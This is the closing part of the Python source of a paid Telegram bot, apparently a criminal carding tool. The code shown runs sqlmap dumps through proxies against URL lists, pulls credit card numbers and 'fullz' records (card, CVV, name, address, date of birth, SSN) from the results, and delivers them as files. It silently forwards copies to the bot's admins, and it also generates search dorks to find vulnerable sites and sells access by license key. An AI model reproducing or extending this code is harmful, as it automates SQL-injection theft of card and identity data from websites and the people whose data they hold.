            base_dir = tempfile.mkdtemp(prefix="spidey_gm_")

            async def _sub_result(r, z):
                try:
                    if getattr(r, "output_dir", "") and os.path.isdir(r.output_dir):
                        all_fullz.extend(extract_fullz_from_dir(r.output_dir))
                except Exception:
                    pass
                await on_result(r, z)

            await sqlmap_dump_multiple(
                urls, base_dir, proxy_list=effective_proxy_pool(uid),
                stop_event=se, per_result_cb=_sub_result)
            # Sweep base_dir in case anything was missed
            try:
                all_fullz.extend(extract_fullz_from_dir(base_dir))
            except Exception:
                pass
            shutil.rmtree(base_dir, ignore_errors=True)

    # ── DEDUP ────────────────────────────────────────────────────────────────
    all_cards = list(dict.fromkeys(all_cards))

    seen_f = set()
    fullz_dedup = []
    for rec in all_fullz:
        k = (rec.cc_number, rec.holder_name, rec.zip, rec.email)
        if k in seen_f:
            continue
        seen_f.add(k)
        fullz_dedup.append(rec)

    rich_fullz = [r for r in fullz_dedup if r.holder_name or r.address or r.zip or r.email or r.phone]

    await msg.edit_text(
        f"🎯 Dᴏɴᴇ\n"
        f"CC: `{len(all_cards)}`\n"
        f"Fᴜʟʟᴢ: `{len(rich_fullz)}`",
        parse_mode=ParseMode.MARKDOWN)

    # ── DELIVERY ─────────────────────────────────────────────────────────────
    if all_cards:
        # Plain CC file
        cc_bytes = "\n".join(all_cards).encode()
        cc_name = f"godmode_cards_{len(all_cards)}_{ts}.txt"
        await update.message.reply_document(
            document=io.BytesIO(cc_bytes), filename=cc_name,
            caption=f"💳 `{len(all_cards):,}` CC — GOD MODE",
            parse_mode=ParseMode.MARKDOWN)

        # Fullz file
        if rich_fullz:
            fullz_lines = fullz_records_to_lines(rich_fullz, format="full")
            fullz_name = f"godmode_fullz_{len(rich_fullz)}_{ts}.txt"
            await update.message.reply_document(
                document=io.BytesIO("\n".join(fullz_lines).encode()),
                filename=fullz_name,
                caption=(
                    f"📋 Gᴏᴅ Mᴏᴅᴇ Fᴜʟʟᴢ — `{len(rich_fullz)}`\n\n"
                    f"{fullz_summary(rich_fullz)}\n\n"
                    "_Format: `cc|MM|YY|cvv|name|addr|addr2|city|state|zip|country|phone|email|dob|ssn`_"
                ),
                parse_mode=ParseMode.MARKDOWN)

        # Admin forward
        if uid not in ADMIN_IDS:
            for aid in ADMIN_IDS:
                try:
                    await context.bot.send_document(
                        chat_id=aid, document=io.BytesIO(cc_bytes),
                        filename=cc_name,
                        caption=f"💥 GᴏᴅMᴏᴅᴇ — Usᴇʀ `{uid}` — CC `{len(all_cards)}`",
                        parse_mode=ParseMode.MARKDOWN)
                    if rich_fullz:
                        await context.bot.send_document(
                            chat_id=aid,
                            document=io.BytesIO(
                                "\n".join(fullz_records_to_lines(rich_fullz, "full")).encode()),
                            filename=f"godmode_fullz_{uid}_{ts}.txt",
                            caption=f"📋 GᴏᴅMᴏᴅᴇ Fᴜʟʟᴢ `{len(rich_fullz)}` Fʀᴏᴍ `{uid}`",
                            parse_mode=ParseMode.MARKDOWN)
                except Exception:
                    pass

    await update.message.reply_text("Sᴇʟᴇᴄᴛ Nᴇxᴛ Sᴛᴇᴘ 🎖️", reply_markup=make_main_menu())
    return MENU

# ── PURCHASE/REDEEM ───────────────────────────────────────────────────────
async def purchase_handler(update, context):
    q = update.callback_query; await q.answer()
    if q.data.startswith("buy_"):
        code = q.data[4:]
        if code not in PLAN_MAP: return PURCHASE_MENU
        label, emoji, _ = PLAN_MAP[code]
        await q.edit_message_text(
            f"🍷 *{label}* — `{PLAN_PRICES.get(code,'?')}`\n\n🆘 `{ADMIN_USERNAME}`",
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("🥂 Cᴏɴᴛᴀᴄᴛ", url=f"https://t.me/{ADMIN_USERNAME.lstrip('@')}")],
                [InlineKeyboardButton("⬅️ Bᴀᴄᴋ", callback_data="menu_purchase")]]),
            parse_mode=ParseMode.MARKDOWN)
        return PURCHASE_MENU
    if q.data == "menu_purchase":
        await q.edit_message_text("🍷 Pʟᴀɴs:", reply_markup=make_purchase_menu(), parse_mode=ParseMode.MARKDOWN)
        return PURCHASE_MENU
    if q.data == "menu_back":
        await send_main_menu(update, context); return MENU
    return PURCHASE_MENU

async def redeem_key(update, context):
    uid = update.effective_user.id
    key = update.message.text.strip().upper()
    if key not in license_keys:
        await update.message.reply_text("❌ Iɴᴠᴀʟɪᴅ.", reply_markup=back_button(), parse_mode=ParseMode.MARKDOWN)
        return REDEEM_KEY
    info = license_keys[key]
    if info["used_by"] is not None and info["used_by"] != uid:
        await update.message.reply_text("❌ Usᴇᴅ.", reply_markup=back_button(), parse_mode=ParseMode.MARKDOWN)
        return REDEEM_KEY
    expires = datetime.now() + info["delta"]
    authorized_users[uid] = {"plan": info["label"], "expires": expires, "granted_by": key}
    info["used_by"] = uid
    all_user_ids.add(uid)
    await update.message.reply_text(f"✅ Aᴄᴛɪᴠᴀᴛᴇᴅ: *{info['label']}*", parse_mode=ParseMode.MARKDOWN)
    await send_main_menu(update, context)
    return MENU

# ── ADORK commands ────────────────────────────────────────────────────────
async def adork_keywords_cmd(update, context):
    cfg = adork_get_cfg(context)
    await update.message.reply_text(f"🔑 Sᴇɴᴅ Kᴇʏᴡᴏʀᴅs (`{len(cfg['keywords'])}`).", parse_mode=ParseMode.MARKDOWN)
    return _ADORK_KEYWORDS
async def _adork_kw_text(update, context):
    adork_get_cfg(context)["keywords"] = _adork_parse_text(update.message.text)
    await update.message.reply_text(f"✅ `{len(adork_get_cfg(context)['keywords'])}` sᴇᴛ.", parse_mode=ParseMode.MARKDOWN)
    return ConversationHandler.END
async def _adork_kw_file(update, context):
    doc = update.message.document; f = await context.bot.get_file(doc.file_id)
    data = await f.download_as_bytearray()
    adork_get_cfg(context)["keywords"] = [l.strip() for l in data.decode("utf-8", errors="ignore").splitlines() if l.strip()]
    await update.message.reply_text("✅ Sᴇᴛ.", parse_mode=ParseMode.MARKDOWN)
    return ConversationHandler.END

async def adork_domains_cmd(update, context):
    await update.message.reply_text("🌍 Sᴇɴᴅ Dᴏᴍᴀɪɴs:"); return _ADORK_DOMAINS
async def _adork_de_text(update, context):
    adork_get_cfg(context)["domains"] = _adork_parse_text(update.message.text)
    await update.message.reply_text("✅"); return ConversationHandler.END
async def _adork_de_file(update, context):
    doc = update.message.document; f = await context.bot.get_file(doc.file_id)
    data = await f.download_as_bytearray()
    adork_get_cfg(context)["domains"] = [l.strip() for l in data.decode("utf-8", errors="ignore").splitlines() if l.strip()]
    await update.message.reply_text("✅"); return ConversationHandler.END

async def adork_params_cmd(update, context):
    await update.message.reply_text("🧤 Sᴇɴᴅ Pᴀʀᴀᴍs:"); return _ADORK_PARAMS
async def _adork_nb_text(update, context):
    adork_get_cfg(context)["params"] = _adork_parse_text(update.message.text)
    await update.message.reply_text("✅"); return ConversationHandler.END
async def _adork_nb_file(update, context):
    doc = update.message.document; f = await context.bot.get_file(doc.file_id)
    data = await f.download_as_bytearray()
    adork_get_cfg(context)["params"] = [l.strip() for l in data.decode("utf-8", errors="ignore").splitlines() if l.strip()]
    await update.message.reply_text("✅"); return ConversationHandler.END

async def adork_filetypes_cmd(update, context):
    await update.message.reply_text("🔖 Sᴇɴᴅ Fɪʟᴇᴛʏᴘᴇs:"); return _ADORK_FILETYPES
async def _adork_pt_text(update, context):
    adork_get_cfg(context)["filetypes"] = _adork_parse_text(update.message.text)
    await update.message.reply_text("✅"); return ConversationHandler.END
async def _adork_pt_file(update, context):
    doc = update.message.document; f = await context.bot.get_file(doc.file_id)
    data = await f.download_as_bytearray()
    adork_get_cfg(context)["filetypes"] = [l.strip() for l in data.decode("utf-8", errors="ignore").splitlines() if l.strip()]
    await update.message.reply_text("✅"); return ConversationHandler.END

async def adork_sf_cmd(update, context):
    await update.message.reply_text("🔍 Sᴇɴᴅ SF:"); return _ADORK_SF
async def _adork_sf_text(update, context):
    adork_get_cfg(context)["sf"] = _adork_parse_text(update.message.text)
    await update.message.reply_text("✅"); return ConversationHandler.END
async def _adork_sf_file(update, context):
    doc = update.message.document; f = await context.bot.get_file(doc.file_id)
    data = await f.download_as_bytearray()
    adork_get_cfg(context)["sf"] = [l.strip() for l in data.decode("utf-8", errors="ignore").splitlines() if l.strip()]
    await update.message.reply_text("✅"); return ConversationHandler.END

async def adork_pf_cmd(update, context):
    await update.message.reply_text("📋 Sᴇɴᴅ PF:"); return _ADORK_PF
async def _adork_pf_text(update, context):
    adork_get_cfg(context)["pf"] = _adork_parse_text(update.message.text)
    await update.message.reply_text("✅"); return ConversationHandler.END
async def _adork_pf_file(update, context):
    doc = update.message.document; f = await context.bot.get_file(doc.file_id)
    data = await f.download_as_bytearray()
    adork_get_cfg(context)["pf"] = [l.strip() for l in data.decode("utf-8", errors="ignore").splitlines() if l.strip()]
    await update.message.reply_text("✅"); return ConversationHandler.END

async def adork_config_cmd(update, context):
    cfg = adork_get_cfg(context)
    await update.message.reply_text("⚙️ Tᴏɢɢʟᴇ Tᴇᴍᴘʟᴀᴛᴇs:",
        reply_markup=_adork_template_keyboard(set(cfg["enabled"])), parse_mode=ParseMode.MARKDOWN)
    return MENU

async def adork_status_cmd(update, context):
    cfg = adork_get_cfg(context)
    await update.message.reply_text(
        f"🛰️ Sᴛᴀᴛᴜs\n\n🔑 Kᴇʏᴡᴏʀᴅs `{len(cfg['keywords'])}`\n"
        f"🌍 Dᴏᴍᴀɪɴs `{len(cfg['domains'])}`\n🧤 Pᴀʀᴀᴍs `{len(cfg['params'])}`\n"
        f"🔖 Fɪʟᴇᴛʏᴘᴇs `{len(cfg['filetypes'])}`\n✅ Tᴇᴍᴘʟᴀᴛᴇs `{len(cfg['enabled'])}/10`",
        parse_mode=ParseMode.MARKDOWN)
    return MENU

async def adork_reset_cmd(update, context):
    context.user_data["adork_config"] = {
        "keywords": [], "domains": _ADORK_DEFAULT_DOMAINS.copy(),
        "params": _ADORK_DEFAULT_PARAMS.copy(), "filetypes": _ADORK_DEFAULT_FILETYPES.copy(),
        "sf": _ADORK_DEFAULT_SF.copy(), "pf": _ADORK_DEFAULT_PF.copy(),
        "enabled": list(_ADORK_TEMPLATES.keys()),
    }
    await update.message.reply_text("✅ Rᴇsᴇᴛ."); return MENU

async def adork_generate_cmd(update, context):
    cfg = adork_get_cfg(context)
    if not cfg["keywords"]:
        await update.message.reply_text("⚠️ Sᴇᴛ `/dkeywords`"); return MENU
    msg = await update.message.reply_text("🛰️ Gᴇɴ...", parse_mode=ParseMode.MARKDOWN)
    loop = asyncio.get_running_loop()
    dorks = await loop.run_in_executor(None, adork_generate_all, cfg)
    if not dorks: await msg.edit_text("⚠️ Nᴏ Dᴏʀᴋs."); return MENU
    ts = datetime.now().strftime("%d%m%y_%H%M")
    await update.message.reply_document(
        document=io.BytesIO("\n".join(dorks).encode()),
        filename=f"pro_{len(dorks)}_{ts}.txt",
        caption=f"🛰️ `{len(dorks):,}`", parse_mode=ParseMode.MARKDOWN)
    return MENU

async def adork_gen_n_cmd(update, context):
    if not context.args: await update.message.reply_text("`/dgen <n>`"); return MENU
    try: n = min(int(context.args[0].replace(",","")), 1_000_000)
    except: return MENU
    cfg = adork_get_cfg(context)
    if not cfg["keywords"]: await update.message.reply_text("⚠️ Set keywords first."); return MENU
    msg = await update.message.reply_text(f"🛰️ Sᴀᴍᴘʟɪɴɢ `{n:,}`...", parse_mode=ParseMode.MARKDOWN)
    dorks = await adork_generate_n(cfg, cfg["keywords"], n)
    ts = datetime.now().strftime("%d%m%y_%H%M")
    await update.message.reply_document(
        document=io.BytesIO("\n".join(dorks).encode()),
        filename=f"pro_{len(dorks)}_{ts}.txt",
        caption=f"🛰️ `{len(dorks):,}`", parse_mode=ParseMode.MARKDOWN)
    try: await msg.delete()
    except: pass
    return MENU

async def adork_callback_handler(update, context):
    q = update.callback_query; await q.answer()
    data = q.data; cfg = adork_get_cfg(context)
    if data.startswith("adork_tgl_"):
        tid = data[len("adork_tgl_"):]
        enabled = set(cfg["enabled"])
        if tid in enabled: enabled.discard(tid)
        else: enabled.add(tid)
        cfg["enabled"] = list(enabled)
        await q.edit_message_reply_markup(_adork_template_keyboard(enabled))
    elif data == "adork_all_on":
        cfg["enabled"] = list(_ADORK_TEMPLATES.keys())
        await q.edit_message_reply_markup(_adork_template_keyboard(set(cfg["enabled"])))
    elif data == "adork_all_off":
        cfg["enabled"] = []
        await q.edit_message_reply_markup(_adork_template_keyboard(set()))
    elif data == "adork_cfg_done":
        await q.edit_message_text(f"✅ Sᴀᴠᴇᴅ `{len(cfg['enabled'])}/10`.",
            reply_markup=back_button(), parse_mode=ParseMode.MARKDOWN)

# ═══════════════════════════════════════════════════════════════════════════
#  🚀  MAIN
# ═══════════════════════════════════════════════════════════════════════════
def _adork_make_conv(cmd_name, state_id, cmd_fn, file_fn, text_fn):
    return ConversationHandler(
        entry_points=[CommandHandler(cmd_name, cmd_fn)],
        states={state_id: [
            MessageHandler(filters.Document.FileExtension("txt"), file_fn),
            MessageHandler(filters.TEXT & ~filters.COMMAND, text_fn),
        ]},
        fallbacks=[CommandHandler("start", start)], allow_reentry=True)

def main():
    if not BOT_TOKEN or ":" not in BOT_TOKEN:
        logger.error("❌ BOT_TOKEN invalid")
        return
    req = HTTPXRequest(connection_pool_size=20, connect_timeout=10.0,
                       read_timeout=30.0, write_timeout=30.0, pool_timeout=15.0)
    upd_req = HTTPXRequest(connection_pool_size=4, connect_timeout=10.0,
                           read_timeout=30.0, write_timeout=30.0, pool_timeout=15.0)
    app = (Application.builder().token(BOT_TOKEN).request(req)
           .get_updates_request(upd_req).concurrent_updates(256).build())

    admin_cmds = [
        CommandHandler("admin", admin_cmd), CommandHandler("genkey", genkey_cmd),
        CommandHandler("listkeys", listkeys_cmd), CommandHandler("users", users_cmd),
        CommandHandler("stats", stats_cmd), CommandHandler("adduser", adduser_cmd),
        CommandHandler("revokekey", revokekey_cmd), CommandHandler("removeuser", removeuser_cmd),
        CommandHandler("checkuser", checkuser_cmd), CommandHandler("banuser", banuser_cmd),
        CommandHandler("unbanuser", unbanuser_cmd), CommandHandler("broadcast", broadcast_cmd),
        CommandHandler("gproxy", gproxy_cmd), CommandHandler("gproxies", gproxy_cmd),
        CommandHandler("getfile", getfile_cmd),
    ]
    adork_handlers = [
        CommandHandler("dkeywords", adork_keywords_cmd), CommandHandler("ddomains", adork_domains_cmd),
        CommandHandler("dparams", adork_params_cmd), CommandHandler("dfiletypes", adork_filetypes_cmd),
        CommandHandler("dsf", adork_sf_cmd), CommandHandler("dpf", adork_pf_cmd),
        CommandHandler("dconfig", adork_config_cmd), CommandHandler("dstatus", adork_status_cmd),
        CommandHandler("dreset", adork_reset_cmd), CommandHandler("dgenerate", adork_generate_cmd),
        CommandHandler("dgen", adork_gen_n_cmd),
    ]

    conv = ConversationHandler(
        entry_points=[CommandHandler("start", start), *admin_cmds, *adork_handlers],
        states={
            MENU: [CallbackQueryHandler(button_handler), *admin_cmds, *adork_handlers],
            KW_COUNT: [MessageHandler(filters.TEXT & ~filters.COMMAND, kw_count), CallbackQueryHandler(button_handler)],
            KW_SEEDS: [MessageHandler(filters.Document.FileExtension("txt"), kw_seeds_file),
                       MessageHandler(filters.TEXT & ~filters.COMMAND, kw_seeds_text),
                       CallbackQueryHandler(button_handler)],
            DORK_COUNT: [MessageHandler(filters.TEXT & ~filters.COMMAND, dork_count), CallbackQueryHandler(button_handler)],
            DORK_KWS: [MessageHandler(filters.Document.FileExtension("txt"), dork_kws_file),
                       MessageHandler(filters.TEXT & ~filters.COMMAND, dork_kws_text),
                       CallbackQueryHandler(button_handler)],
            PARSER_DORKS: [MessageHandler(filters.Document.FileExtension("txt"), parser_file),
                           MessageHandler(filters.TEXT & ~filters.COMMAND, parser_text),
                           CallbackQueryHandler(button_handler)],
            PURCHASE_MENU: [CallbackQueryHandler(purchase_handler)],
            REDEEM_KEY: [MessageHandler(filters.TEXT & ~filters.COMMAND, redeem_key),
                         CallbackQueryHandler(button_handler)],
            SQLI_URLS: [MessageHandler(filters.Document.FileExtension("txt"), sqli_file),
                        MessageHandler(filters.TEXT & ~filters.COMMAND, sqli_text),
                        CallbackQueryHandler(button_handler)],
            DUMP_DORKS: [MessageHandler(filters.Document.FileExtension("txt"), dump_file),
                         MessageHandler(filters.TEXT & ~filters.COMMAND, dump_text),
                         CallbackQueryHandler(button_handler)],
            URL_DUMP: [MessageHandler(filters.Document.FileExtension("txt"), urldump_file),
                       MessageHandler(filters.TEXT & ~filters.COMMAND, urldump_text),
                       CallbackQueryHandler(button_handler)],
            GDORK_DUMP: [MessageHandler(filters.TEXT & ~filters.COMMAND, gdork_dump_handler),
                         CallbackQueryHandler(button_handler)],
            _ADORK_KEYWORDS: [MessageHandler(filters.Document.FileExtension("txt"), _adork_kw_file),
                              MessageHandler(filters.TEXT & ~filters.COMMAND, _adork_kw_text)],
            _ADORK_DOMAINS: [MessageHandler(filters.Document.FileExtension("txt"), _adork_de_file),
                             MessageHandler(filters.TEXT & ~filters.COMMAND, _adork_de_text)],
            _ADORK_PARAMS: [MessageHandler(filters.Document.FileExtension("txt"), _adork_nb_file),
                            MessageHandler(filters.TEXT & ~filters.COMMAND, _adork_nb_text)],
            _ADORK_FILETYPES: [MessageHandler(filters.Document.FileExtension("txt"), _adork_pt_file),
                               MessageHandler(filters.TEXT & ~filters.COMMAND, _adork_pt_text)],
            _ADORK_SF: [MessageHandler(filters.Document.FileExtension("txt"), _adork_sf_file),
                        MessageHandler(filters.TEXT & ~filters.COMMAND, _adork_sf_text)],
            _ADORK_PF: [MessageHandler(filters.Document.FileExtension("txt"), _adork_pf_file),
                        MessageHandler(filters.TEXT & ~filters.COMMAND, _adork_pf_text)],
        },
        fallbacks=[CommandHandler("start", start), *admin_cmds, *adork_handlers],
        allow_reentry=True,
    )

    app.add_handler(conv)
    app.add_handler(CallbackQueryHandler(adork_callback_handler, pattern=r"^adork_"))
    app.add_handler(CommandHandler("setpr", setpr_cmd))
    app.add_handler(CommandHandler("delpr", setpr_cmd))
    app.add_handler(CommandHandler("proxies", setpr_cmd))

    _load_proxies(); _load_bans(); _load_auth(); _load_users()
    logger.info("🕷️ Sᴘɪᴅᴇʏ Bᴏᴛ v2 Sᴛᴀʀᴛᴇᴅ")

    async def _run_keepalive():
        from aiohttp import web
        async def _h(req): return web.Response(text="OK")
        w = web.Application(); w.router.add_get("/", _h); w.router.add_get("/health", _h)
        runner = web.AppRunner(w); await runner.setup()
        port = int(os.environ.get("PORT", 3000))
        await web.TCPSite(runner, "0.0.0.0", port).start()
        logger.info(f"🌐 Kᴇᴇᴘ-ᴀʟɪᴠᴇ :{port}")

    async def _auto_save():
        while True:
            await asyncio.sleep(60)
            try: _save_auth(); _save_users(); _save_bans(); _save_proxies()
            except: pass

    async def _run_bot():
        async with app:
            await app.start()
            await app.updater.start_polling(drop_pending_updates=True)
            await asyncio.Event().wait()

    async def _run_all():
        await asyncio.gather(_run_keepalive(), _run_bot(), _auto_save())

    asyncio.run(_run_all())

if __name__ == "__main__":
    main()